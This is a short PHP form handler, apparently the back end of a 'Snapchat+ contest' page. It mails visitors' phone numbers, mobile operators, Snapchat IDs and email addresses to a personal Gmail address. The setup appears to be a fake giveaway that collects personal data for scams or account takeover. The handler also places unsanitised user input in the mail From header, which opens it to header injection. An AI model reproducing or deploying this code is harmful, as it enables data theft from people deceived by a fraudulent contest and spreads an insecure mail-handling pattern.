<?php
// submit-form.php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $phone = htmlspecialchars($_POST['phone']);
    $operator = htmlspecialchars($_POST['operator']);
    $snap_id = htmlspecialchars($_POST['snap_id']);
    $email = htmlspecialchars($_POST['email']);

    // Envoi par email (exemple)
    $to = "daluzrafael000@gmail.com";
    $subject = "Nouvelle participation au concours Snapchat+";
    $message = "
        Numéro : $phone\n
        Opérateur : $operator\n
        ID Snapchat : $snap_id\n
        Email : $email
    ";
    $headers = "From: $email";

    if (mail($to, $subject, $message, $headers)) {
        echo "<p>Merci ! Nous vous recontacterons bientôt.</p>";
    } else {
        echo "<p>Erreur, réessayez plus tard.</p>";
    }
}
?>
